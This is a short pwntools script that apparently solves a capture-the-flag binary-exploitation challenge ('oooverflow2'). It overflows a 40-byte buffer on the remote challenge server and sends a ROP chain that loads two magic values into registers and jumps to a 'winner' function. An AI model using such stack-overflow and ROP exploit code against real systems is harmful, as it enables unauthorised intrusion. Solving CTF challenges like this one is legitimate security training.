from pwn import *

p = remote("pwn.minuteman.umasscybersec.org", 9123)
# p = process("./oooverflow2")

# gdb.attach(p, """
#     echo "hi"
#     break *0x00000000004019b8
#     c
# """)

leg = b""

leg += p64(0x402291) # pop rdi ; ret
leg += p64(0xCAFEBABE)
leg += p64(0x4137b3) # pop rsi ; ret
leg += p64(0xDEADBEEF)
leg += p64(0x401016) # ret (for stack alignment)
leg += p64(0x401928) # winner

p.sendline(b"A" * 32 + b"B" * 8 + leg)

p.interactive()
